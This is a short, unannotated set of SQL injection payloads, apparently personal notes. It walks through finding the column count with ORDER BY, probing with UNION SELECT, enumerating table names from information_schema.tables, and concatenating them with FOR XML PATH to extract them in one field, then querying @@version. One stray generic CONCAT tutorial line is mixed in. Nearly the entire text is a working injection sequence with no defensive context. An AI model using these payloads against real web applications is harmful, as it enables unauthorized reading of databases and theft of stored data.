
'order by 8-- -
AAA 'union select 1,2,3,4,5,6,7-- -

AAA 'union select 1,table_name,3,4,5,6,7 from  information_schema.tables-- -

select table_name from  information_schema.tables

SELECT CONCAT("SQL ", "Tutorial ", "is ", "fun!") AS ConcatenatedString; 
table_name from  information_schema.tables

Select SUBSTRING( 
( select table_name from  information_schema.tables FOR XML PATH('')), 
2 , 9999) As tables

AAA 'union select 1, SUBSTRING( 
( select table_name from  information_schema.tables FOR XML PATH('')), 
2 , 9999),3,4,5,6,7-- -


```
@@version


```